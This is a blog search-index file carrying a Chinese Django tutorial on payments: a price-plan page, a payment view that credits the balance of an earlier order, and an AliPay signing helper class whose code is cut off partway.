<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>支付</title>
      <link href="/2020/08/02/14%20%E6%94%AF%E4%BB%98/"/>
      <url>/2020/08/02/14%20%E6%94%AF%E4%BB%98/</url>
      
        <content type="html"><![CDATA[<h2 id="14-支付"><a href="#14-支付" class="headerlink" title="14 支付"></a>14 支付</h2><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Django%E5%9B%BE%E7%89%87/%E4%BB%B7%E6%A0%BC%E9%A1%B5%E9%9D%A2.jpg"  alt="价格页面"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Django%E5%9B%BE%E7%89%87/%E6%94%AF%E4%BB%98%E5%AE%9D%E6%94%AF%E4%BB%98.jpg"  alt="支付宝支付">)<img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Django%E5%9B%BE%E7%89%87/%E8%AE%A2%E5%8D%95%E4%BF%A1%E6%81%AF.jpg"  alt="订单信息"></p><h3 id="14-1-价格展示页面"><a href="#14-1-价格展示页面" class="headerlink" title="14.1 价格展示页面"></a>14.1 价格展示页面</h3><p>无需登陆，把价格页面的url设置到白名单上</p><h4 id="14-1-1构造价格页面的url"><a href="#14-1-1构造价格页面的url" class="headerlink" title="14.1.1构造价格页面的url"></a>14.1.1构造价格页面的url</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 价格页面</span></span><br><span class="line">url(<span class="string">r'^price/$'</span>, home.price, name=<span class="string">'price'</span>),</span><br></pre></td></tr></table></figure><h4 id="14-1-2-后端提取价格策略的套餐信息"><a href="#14-1-2-后端提取价格策略的套餐信息" class="headerlink" title="14.1.2 后端提取价格策略的套餐信息"></a>14.1.2 后端提取价格策略的套餐信息</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">price</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="string">"""套餐"""</span></span><br><span class="line">    <span class="comment"># 获取套餐</span></span><br><span class="line">    policy_list = models.PricePolicy.objects.filter(category=<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">'price.html'</span>, &#123;<span class="string">'policy_list'</span>: policy_list&#125;)</span><br></pre></td></tr></table></figure><h4 id="14-1-3-前端展示价格"><a href="#14-1-3-前端展示价格" class="headerlink" title="14.1.3 前端展示价格"></a>14.1.3 前端展示价格</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends 'layout/basic.html' %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block title %&#125;</span><br><span class="line">    套餐</span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block css %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.slogan</span>&#123;</span></span><br><span class="line">            font-size: 36px;</span><br><span class="line">            text-align: center;</span><br><span class="line">            margin: 50px 0;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"slogan"</span>&gt;</span>多种方案，适用多种场景<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">            &#123;% for item in policy_list %&#125;</span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-4"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel panel-default"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-heading"</span> <span class="attr">style</span>=<span class="string">"text-align: center"</span>&gt;</span>&#123;&#123; item.title &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-body"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"text-align: center;font-size: 25px;margin-bottom: 0"</span>&gt;</span></span><br><span class="line">                                ￥ &#123;&#123; item.price &#125;&#125; / 年</span><br><span class="line">                            <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"list-group"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"list-group-item"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">"form-inline"</span> <span class="attr">method</span>=<span class="string">"get"</span> <span class="attr">action</span>=<span class="string">"&#123;% url 'payment' policy_id=item.id %&#125;"</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"input-group"</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"input-group-addon"</span>&gt;</span>数量<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"number"</span> <span class="attr">name</span>=<span class="string">"number"</span> <span class="attr">value</span>=<span class="string">"1"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"购买数量"</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"input-group-btn"</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"立即购买"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"list-group-item"</span>&gt;</span>最大项目数量：&#123;&#123; item.project_num &#125;&#125; 个<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"list-group-item"</span>&gt;</span>最大项目空间：&#123;&#123; item.project_space &#125;&#125; G<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"list-group-item"</span>&gt;</span>最大文件支持：&#123;&#123; item.per_file_size &#125;&#125; M<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"list-group-item"</span>&gt;</span>项目成员：&#123;&#123; item.project_member &#125;&#125; 人<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            &#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><h3 id="14-2-支付页面"><a href="#14-2-支付页面" class="headerlink" title="14.2 支付页面"></a>14.2 支付页面</h3><h4 id="14-2-1-构造支付页面的url地址"><a href="#14-2-1-构造支付页面的url地址" class="headerlink" title="14.2.1 构造支付页面的url地址"></a>14.2.1 构造支付页面的url地址</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url(<span class="string">r'^payment/(?P&lt;policy_id&gt;\d+)/$'</span>, home.payment, name=<span class="string">'payment'</span>),</span><br></pre></td></tr></table></figure><h4 id="14-2-2-后端处理"><a href="#14-2-2-后端处理" class="headerlink" title="14.2.2 后端处理"></a>14.2.2 后端处理</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payment</span><span class="params">(request, policy_id)</span>:</span></span><br><span class="line">    <span class="string">""" 支付页面 """</span></span><br><span class="line">    <span class="comment"># 1.价格策略</span></span><br><span class="line">    policy_obj = models.PricePolicy.objects.filter(id=policy_id, category=<span class="number">2</span>).first()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> policy_obj:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">'price'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2.要购买的数量</span></span><br><span class="line">    number = request.GET.get(<span class="string">'number'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> number <span class="keyword">or</span> <span class="keyword">not</span> number.isdecimal():</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">'price'</span>)</span><br><span class="line">    number = int(number)</span><br><span class="line">    <span class="keyword">if</span> number &lt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">'price'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3.计算价格</span></span><br><span class="line">    origin_price = number * policy_obj.price</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4.之前购买过套餐</span></span><br><span class="line">    balance = <span class="number">0</span></span><br><span class="line">    _object = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> request.tracer.price_policy.category == <span class="number">2</span>:</span><br><span class="line">        <span class="comment"># 找到之前的订单，总支付费用、开始结束时间、剩余天数 = 抵扣的钱</span></span><br><span class="line">        _object = models.Transaction.objects.filter(user=request.tracer.user, status=<span class="number">2</span>).order_by(<span class="string">'-id'</span>).first()</span><br><span class="line">        total_timedelta = _object.end_datetime - _object.start_datetime</span><br><span class="line">        balance_timedelta = _object.end_datetime - datetime.datetime.now()</span><br><span class="line">        <span class="keyword">if</span> total_timedelta.days == balance_timedelta.days:</span><br><span class="line">            balance = _object.price / total_timedelta.days * (balance_timedelta.days - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            balance = _object.price / total_timedelta.days * balance_timedelta.days</span><br><span class="line">    <span class="keyword">if</span> balance &gt;= origin_price:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">'price'</span>)</span><br><span class="line"></span><br><span class="line">    context = &#123;</span><br><span class="line">        <span class="string">'policy_id'</span>: policy_obj.id,</span><br><span class="line">        <span class="string">'number'</span>: number,</span><br><span class="line">        <span class="string">'origin_price'</span>: origin_price,</span><br><span class="line">        <span class="string">'balance'</span>: round(balance, <span class="number">2</span>),</span><br><span class="line">        <span class="string">'total_price'</span>: origin_price - round(balance, <span class="number">2</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    conn = get_redis_connection()</span><br><span class="line">    key = <span class="string">'payment_&#123;&#125;'</span>.format(request.tracer.user.mobile_phone)</span><br><span class="line">    conn.set(key, json.dumps(context), ex=<span class="number">60</span> * <span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">    context[<span class="string">'policy_obj'</span>] = policy_obj</span><br><span class="line">    context[<span class="string">'transaction'</span>] = _object</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">'payment.html'</span>, context)</span><br></pre></td></tr></table></figure><h4 id="14-2-3-前端展示"><a href="#14-2-3-前端展示" class="headerlink" title="14.2.3 前端展示"></a>14.2.3 前端展示</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends 'layout/basic.html' %&#125;</span><br><span class="line">&#123;% load static %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block title %&#125;</span><br><span class="line">    订单</span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;% block css %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.slogan</span> &#123;</span></span><br><span class="line">            font-size: 36px;</span><br><span class="line">            text-align: center;</span><br><span class="line">            margin: 50px 0;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>订单信息(30分钟失效)<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>订单<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>单价<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>数量<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>原价<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>原订单抵扣<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">th</span>&gt;</span>实际支付<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; policy_id.title &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>￥&#123;&#123; policy_id.price &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; number &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>￥&#123;&#123; origin_price &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>￥&#123;&#123; balance &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>￥&#123;&#123; total_price &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">        &#123;% if transaction %&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"alert alert-warning"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span>&gt;</span>原订单抵扣：￥&#123;&#123; balance &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                    原订单时间为 &#123;&#123; transaction.start_datetime &#125;&#125;</span><br><span class="line">                    ~ &#123;&#123; transaction.end_datetime &#125;&#125;，且实际支付￥&#123;&#123; transaction.price &#125;&#125;</span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        &#123;% endif %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'pay' %&#125;"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span>立即支付<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><h3 id="14-3-支付宝支付"><a href="#14-3-支付宝支付" class="headerlink" title="14.3 支付宝支付"></a>14.3 支付宝支付</h3><p>参考支付宝支付</p><h4 id="14-3-1支付宝支付接口-PC端支付接口"><a href="#14-3-1支付宝支付接口-PC端支付接口" class="headerlink" title="14.3.1支付宝支付接口(PC端支付接口)"></a>14.3.1支付宝支付接口(PC端支付接口)</h4><p>在utils文件夹下创建alipay.py文件存放支付宝接口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Signature <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote_plus</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse, parse_qs</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> decodebytes, encodebytes</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AliPay</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    支付宝支付接口(PC端支付接口)</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, appid, app_notify_url, app_private_key_path,</span></span></span><br><span class="line"><span class="function"><span class="params">                 alipay_public_key_path, return_url)</span>:</span></span><br><span class="line">        self.appid = appid</span><br><span class="line">        self.app_notify_url = app_notify_url</span><br><span class="line">        self.app_private_key_path = app_private_key_path</span><br><span class="line">        self.app_private_key = <span class="literal">None</span></span><br><span class="line">        self.return_url = return_url</span><br><span class="line">        <span class="keyword">with</span> open(self.app_private_key_path) <span class="keyword">as</span> fp:</span><br><span class="line">            self.app_private_key = RSA.importKey(fp.read())</span><br><span class="line">        self.alipay_public_key_path = alipay_public_key_path</span><br><span class="line">        <span class="keyword">with</span> open(self.alipay_public_key_path) <span class="keyword">as</span> fp:</span><br><span class="line">            self.alipay_public_key = RSA.importKey(fp.read())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">direct_pay</span><span class="params">(self, subject, out_trade_no, total_amount, return_url=None, **kwargs)</span>:</span></span><br><span class="line">        biz_content = &#123;</span><br><span class="line">            <span class="string">"subject"</span>: subject,</span><br><span class="line">            <span class="string">"out_trade_no"</span>: out_trade_no,</span><br><span class="line">            <span class="string">"total_amount"</span>: total_amount,</span><br><span class="line">            <span class="string">"product_code"</span>: <span class="string">"FAST_INSTANT_TRADE_PAY"</span>,</span><br><span class="line">            <span class="comment"># "qr_pay_mode":4</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        biz_content.update(kwargs)</span><br><span class="line">        data = self.build_body(<span class="string">"alipay.trade.page.pay"</span>, biz_content, self.return_url)</span><br><span class="line">        <span class="keyword">return</span> self.sign_data(data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">build_body</span><span class="params">(self, method, biz_content, return_url=None)</span>:</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"app_id"</span>: self.appid,</span><br><span class="line">            <span class="string">"method"</span>: method,</span><br><span class="line">            <span class="string">"charset"</span>: <span class="string">"utf-8"</span>,</span><br><span class="line">            <span class="string">"sign_type"</span>: <span class="string">"RSA2"</span>,</span><br><span class="line">            <span class="string">"timestamp"</span>: datetime.now().strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>),</span><br><span class="line">            <span class="string">"version"</span>: <span class="string">"1.0"</span>,</span><br><span class="line">            <span class="string">"biz_content"</span>: biz_content</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> return_url <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            data[<span class="string">"notify_url"</span>] = self.app_notify_url</span><br><span class="line">            data[<span class="string">"return_url"</span>] = self.return_url</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sign_data</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        data.pop(<span class="string">"sign"</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="comment"># 排序后的字符串</span></span><br><span class="line">        unsigned_items = self.ordered_data(data)</span><br><span class="line">        unsigned_string = <span class="string">"&amp;"</span>.join(<span class="string">"&#123;0&#125;=&#123;1&#125;"</span>.format(k, v) <span class="keyword">for</span> k, v <span class="keyword">in</span> unsigned_items)</span><br><span class="line">        sign = self.sign(unsigned_string.encode(<span class="string">"utf-8"</span>))</span><br><span class="line">        <span class="comment"># ordered_items = self.ordered_data(data)</span></span><br><span class="line">        quoted_string = <span class="string">"&amp;"</span>.join(<span class="string">"&#123;0&#125;=&#123;1&#125;"</span>.format(k, quote_plus(v)) <span class="keyword">for</span> k, v <span class="keyword">in</span> unsigned_items)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 获得最终的订单信息字符串</span></span><br><span class="line">        signed_string = quoted_string + <span class="string">"&amp;sign="</span> + quote_plus(sign)</span><br><span class="line">        <span class="keyword">return</span> signed_string</span><br><span 